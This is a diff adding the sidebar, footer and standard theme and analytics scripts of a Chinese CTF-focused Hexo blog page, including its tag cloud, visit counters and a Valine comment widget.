href="#%E5%85%A8%E6%A0%88%E6%89%8B"><span class="nav-number">5.1.</span> <span class="nav-text">全栈手</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="故里"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">故里</p>
+  <div class="site-description" itemprop="description">没有所谓失败，除非你不再尝试</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:2596328958@qq.com" title="E-Mail → mailto:2596328958@qq.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+<!--添加标签云-->
+        
+          <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+          <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+          <div class="widget-wrap">
+            <div>标签云</div>
+            <div id="myCanvasContainer" class="widget tagcloud">
+              <canvas width="250" height="250" id="resCanvas" style="width=100%">
+              <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">56</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E5%88%B7%E9%A2%98%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" rel="tag">CTF刷题平台推荐</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/" rel="tag">HTTP头部信息分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E7%89%B9%E6%80%A7/" rel="tag">PHP特性</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/" rel="tag">RE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">20</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%B7%A5%E5%85%B7%E5%8C%85/" rel="tag">Web工具包</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugctf/" rel="tag">bugctf</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctfshow/" rel="tag">ctfshow</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/next%E4%B8%BB%E9%A2%98%E5%A4%B1%E6%95%88/" rel="tag">next主题失效</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8D%E8%92%9C%E5%AD%90%E4%B8%8D%E6%98%BE%E7%A4%BA/" rel="tag">不蒜子不显示</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/" rel="tag">博客主题优化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%AD%BB%E5%BE%AA%E7%8E%AF%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/" rel="tag">博客死循环框架问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" rel="tag">博客部分问题解决方法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%80%E5%9F%9F%E7%BD%91%E6%94%BB%E5%87%BB/" rel="tag">局域网攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" rel="tag">常用指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%95%99%E8%A8%80%E6%9D%BF/" rel="tag">留言板</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" rel="tag">评论系统</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" rel="tag">赛后复盘</a><span class="tag-list-count">34</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" rel="tag">黑盒测试</a><span class="tag-list-count">1</span></li></ul>
+              </canvas>
+            </div>
+         </div>
+        
+	  
+
+	  
+	  
+	  
+
+
+   </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003011号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000197%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000197号 </a>
+  </div>
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+   </span>
+  <span class="author" itemprop="copyrightHolder">故里</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">765k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:36</span>
+</div>
+
+
+
+
+
+
+
+<section class="footer-time">
+    <span class="footer__copyright">
+    <div>
+    <span id="span_dt_dt"> </span>
+    <script language="javascript">
+      function show_date_time(){
+        window.setTimeout("show_date_time()", 1000);
+        BirthDay=new Date("12/25/2021 10:56:12");//这个日期是可以修改的
+        today=new Date();
+        timeold=(today.getTime()-BirthDay.getTime());//其实仅仅改了这里
+        sectimeold=timeold/1000
+        secondsold=Math.floor(sectimeold);
+        msPerDay=24*60*60*1000
+        e_daysold=timeold/msPerDay
+        daysold=Math.floor(e_daysold);
+        e_hrsold=(e_daysold-daysold)*24;
+        hrsold=Math.floor(e_hrsold);
+        e_minsold=(e_hrsold-hrsold)*60;
+        minsold=Math.floor((e_hrsold-hrsold)*60);
+        seconds=Math.floor((e_minsold-minsold)*60);
+        span_dt_dt.innerHTML="我已在此等候你 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+      }
+      show_date_time();
+    </script>
+    </div>
+	
+	
+
+
+
+
+<!--这一段是不蒜子的访问量统计代码-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+我的第<span id="busuanzi_value_site_uv"></span>位朋友
+历经<span id="busuanzi_value_site_pv"></span>次回眸才与你相遇</span>
+
+	 
+	 
+	 
+
+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,225' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'kkHz96fwDwdnhN10VTUS0KUx-gzGzoHsz',
+      appKey     : '3th47KWUKTQ2oX3tNXqz6WQW',
+      placeholder: "来留下你的痕迹吧",
+      avatar     : 'retro',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
+
+
+
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+
+<script type="text/javascript">
+    var OriginTitile=document.title,st;
+	document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ网页崩溃了",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的，别走了！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+</script>
